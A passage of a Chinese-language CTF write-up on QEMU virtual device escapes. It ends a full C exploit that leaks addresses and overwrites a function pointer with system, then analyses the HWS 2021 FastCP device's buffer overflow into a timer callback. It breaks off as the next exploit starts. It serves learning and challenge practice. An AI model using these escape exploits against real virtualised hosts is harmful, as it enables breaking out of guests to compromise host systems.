class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> offset, <span class="type">uint32_t</span> value)</span> &#123;</span><br><span class="line">    *((<span class="type">uint32_t</span> *) mmio_mem + offset) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span> *) mmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> pmio_mem = <span class="number">0x000000000000c050</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> offset, <span class="type">uint32_t</span> value)</span> &#123;</span><br><span class="line">    outl(value, pmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> inl(pmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_abread</span><span class="params">(<span class="type">uint32_t</span> offset)</span> &#123;</span><br><span class="line">    pmio_write(<span class="number">0</span>, offset &lt;&lt; <span class="number">2</span>);  <span class="comment">// 设置 opaque-&gt;addr</span></span><br><span class="line">    <span class="type">uint64_t</span> val = pmio_read(<span class="number">4</span>);</span><br><span class="line">    pmio_write(<span class="number">0</span>, (offset + <span class="number">1</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> val | (<span class="number">1ULL</span> * pmio_read(<span class="number">4</span>) &lt;&lt; <span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_abwrite</span><span class="params">(<span class="type">uint32_t</span> offset, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">    pmio_write(<span class="number">0</span>, offset &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span>, value &amp; <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">    pmio_write(<span class="number">0</span>, (offset + <span class="number">1</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span>, value &gt;&gt; <span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> cmd[] = <span class="string">&quot;cat flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(cmd); i += <span class="number">4</span>) &#123;</span><br><span class="line">        mmio_write(<span class="number">4</span> + i / <span class="number">4</span>, *(<span class="type">uint32_t</span> *) &amp;cmd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to set io permission.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> arg_addr = pmio_abread(<span class="number">70</span>) + <span class="number">0xb08</span>;</span><br><span class="line">    <span class="type">size_t</span> elf_base = pmio_abread(<span class="number">68</span>) - <span class="number">0x29ac8e</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] arg addr: %p\n&quot;</span>, arg_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] elf base: %p\n&quot;</span>, elf_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] STRNGState addr: %p\n&quot;</span>, arg_addr - <span class="number">0xb08</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> system_plt = elf_base + <span class="number">0x200d50</span>;</span><br><span class="line"></span><br><span class="line">    pmio_abwrite(<span class="number">70</span>, arg_addr);</span><br><span class="line">    pmio_abwrite(<span class="number">68</span>, system_plt);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HWS-2021-FastCP"><a href="#HWS-2021-FastCP" class="headerlink" title="[HWS 2021] FastCP"></a>[HWS 2021] FastCP</h2><h3 id="关键源码"><a href="#关键源码" class="headerlink" title="关键源码"></a>关键源码</h3><h4 id="fastcp-mmio-read"><a href="#fastcp-mmio-read" class="headerlink" title="fastcp_mmio_read"></a>fastcp_mmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">fastcp_mmio_read</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">8</span> &amp;&amp; addr &lt;= <span class="number">0x1F</span> || addr &gt; <span class="number">0x1F</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_src;</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !addr )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;handling;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( addr != <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x18</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;cp_state.cmd;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="fastcp-mmio-write"><a href="#fastcp-mmio-write" class="headerlink" title="fastcp_mmio_write"></a>fastcp_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">fastcp_mmio_write</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int64_t</span> ns; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (size == <span class="number">8</span> || addr &gt; <span class="number">0x1F</span>) &amp;&amp; addr &lt;= <span class="number">0x1F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">        opaque-&gt;cp_state.CP_list_cnt = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x18</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opaque-&gt;cp_state.cmd = val;</span><br><span class="line">        ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">        timer_mod(&amp;opaque-&gt;cp_timer, ns / <span class="number">1000000</span> + <span class="number">100</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">8</span> &amp;&amp; opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;cp_state.CP_list_src = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="fastcp-cp-timer"><a href="#fastcp-cp-timer" class="headerlink" title="fastcp_cp_timer"></a>fastcp_cp_timer</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">fastcp_cp_timer</span><span class="params">(FastCPState *opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> cmd; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">uint64_t</span> CP_list_cnt; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">uint64_t</span> v4; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">uint64_t</span> v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">uint64_t</span> v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">bool</span> v7; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">uint64_t</span> v8; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  FastCP_CP_INFO cp_info; <span class="comment">// [rsp+0h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+38h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  cmd = opaque-&gt;cp_state.cmd;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;cp_info, <span class="number">0</span>, <span class="keyword">sizeof</span>(cp_info));</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">      v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);<span class="comment">// 从opaque-&gt;cp_list_src中读取0x18字节数据到cp_info中</span></span><br><span class="line">        <span class="keyword">if</span> ( cp_info.CP_cnt &lt;= <span class="number">0x1000</span> )</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">        v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL;</span><br><span class="line">        opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">        cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);</span><br><span class="line">        v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">        opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &amp; <span class="number">8</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">          <span class="keyword">if</span> ( msi_enabled(&amp;opaque-&gt;pdev) )</span><br><span class="line">            msi_notify(&amp;opaque-&gt;pdev, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            pci_set_irq(&amp;opaque-&gt;pdev, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;                          <span class="comment">// handling = 0</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">      CP_list_cnt = opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( CP_list_cnt &gt; <span class="number">0x10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_22:</span><br><span class="line">        v8 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v9 = <span class="number">3</span> * v8++;</span><br><span class="line">          cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + <span class="number">8</span> * v9, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( opaque-&gt;cp_state.CP_list_cnt &gt; v8 );</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !CP_list_cnt )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">          v6 = cmd &amp; <span class="number">0xFFFFFFFFFFFFFFFE</span>LL;</span><br><span class="line">          opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        &#125;</span><br><span class="line">        v3 = <span class="number">0LL</span>;</span><br><span class="line">        v4 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          cpu_physical_memory_rw(v3 + opaque-&gt;cp_state.CP_list_src, buf, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v12 &gt; <span class="number">0x1000</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v5 = opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">          ++v4;</span><br><span class="line">          v3 += <span class="number">24LL</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v4 &gt;= v5 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !v5 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cmd = opaque-&gt;cp_state.cmd;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  opaque-&gt;cp_state.cmd = <span class="number">0LL</span>;</span><br><span class="line">LABEL_16:</span><br><span class="line">  opaque-&gt;handling = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以看到<code>read</code>函数的功能是分别获取<code>cp_list_src</code>、<code>cp_list_cnt</code>、<code>cmd</code>的值，而<code>write</code>函数则是设置这<code>3</code>个参数，其中在设置<code>cmd</code>这个参数时还会调用<code>timer_mod</code>函数。我们把重点放在<code>fastcp_cp_timer</code>函数中。可以看到该函数会按照<code>cmd</code>的值的不同进行不同的操作。当<code>cmd</code>的值为<code>1</code>时，我们重点看下面这段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v9 = <span class="number">3</span> * v8++;</span><br><span class="line">cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + <span class="number">8</span> * v9, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>我们首先来看看<code>cpu_physical_memory_rw</code>函数。该函数的原型大概如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cpu_physical_memory_rw</span><span class="params">(hwaddr addr,</span></span><br><span class="line"><span class="params">                            <span class="type">void</span> *buf,</span></span><br><span class="line"><span class="params">                            hwaddr len,</span></span><br><span class="line"><span class="params">                            <span class="type">bool</span> is_write)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>hwaddr addr</code>：要读取或写入的物理内存地址。</li><li><code>void *buf</code>：指向数据缓冲区的指针，该缓冲区包含要写入内存的数据（在写入操作时），或用于接收从内存中读取的数据（在读取操作时）。</li><li><code>hwaddr len</code>：要读取或写入的数据长度。</li><li><code>bool is_write</code>：指示操作是读取<code>（false）</code>还是写入<code>（true）</code>。</li></ul><p>可以看到程序会遍历<code>CP_list_src</code>并将其数据复制<code>0x18</code>字节到<code>cp_info</code>，然后从<code>cp_info.CP_src</code>复制c<code>p_info.CP_cnt</code>字节的数据到<code>opaque-&gt;CP_buffer</code>，最后从<code>opaque-&gt;CP_buffer</code>复制<code>cp_info.CP_cnt</code>字节数据到<code>cp_info.CP_dst</code>中，即从<code>cp_info.CP_src</code>复制<code>cp_info.CP_cnt</code>字节的数据到<code>cp_info.CP_dst</code>中。我们可以想到，当<code>CP_cnt</code>足够大时是不是可以造成溢出呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00000000 FastCPState struc ; (sizeof=0x1A30, align=0x10, copyof_4530)</span><br><span class="line">00000000 pdev PCIDevice_0 ?</span><br><span class="line">000008F0 mmio MemoryRegion_0 ?</span><br><span class="line">000009E0 cp_state CP_state ?</span><br><span class="line">000009F8 handling db ?</span><br><span class="line">000009F9 db ? ; undefined</span><br><span class="line">000009FA db ? ; undefined</span><br><span class="line">000009FB db ? ; undefined</span><br><span class="line">000009FC irq_status dd ?</span><br><span class="line">00000A00 CP_buffer db 4096 dup(?)</span><br><span class="line">00001A00 cp_timer QEMUTimer_0 ?</span><br><span class="line">00001A30 FastCPState ends</span><br></pre></td></tr></table></figure><p>我们可以看到，<code>CP_buffer</code>变量只有<code>0x1000</code>字节，当<code>CP_cnt</code>足够大时，我们就可以对<code>cp_timer</code>结构体进行读写操作。我们再来看看<code>cp_timer</code>结构体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000 QEMUTimer_0 struc ; (sizeof=0x30, align=0x8, copyof_1181)</span><br><span class="line">00000000                                         ; XREF: FastCPState/r</span><br><span class="line">00000000 expire_time dq ?</span><br><span class="line">00000008 timer_list dq ?                         ; offset</span><br><span class="line">00000010 cb dq ?                                 ; offset</span><br><span class="line">00000018 opaque dq ?                             ; offset</span><br><span class="line">00000020 next dq ?                               ; offset</span><br><span class="line">00000028 attributes dd ?</span><br><span class="line">0000002C scale dd ?</span><br><span class="line">00000030 QEMUTimer_0 ends</span><br></pre></td></tr></table></figure><p>我们可以看到我们熟悉的<code>cb</code>指针和<code>opaque</code>指针。我们可以利用溢出来读取地址然后通过溢出来修改<code>cb</code>指针为<code>system</code>的<code>plt</code>表，<code>opaque</code>指向函数参数即可完成逃逸<br>这里提一下<code>WJH</code>师傅说的要注意的点：所有在设备中的操作地址都是指 <code>QEMU</code> 模拟的物理地址，但是程序中使用 <code>mmap</code> 申请的是虚拟地址空间。所以要注意使用 <code>mmap</code> 申请出来的超过一页的部分，在物理空间上不连续。如果需要操作那块空间，需要使用那一页的虚拟地址重新计算对应的物理地址<br>原理懂了后，由于很烂的<code>C</code>语言水平，还是写不出<code>exp</code>脚本，以下为参考<code>WJH</code>师傅的<code>exp</code>所编写</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span 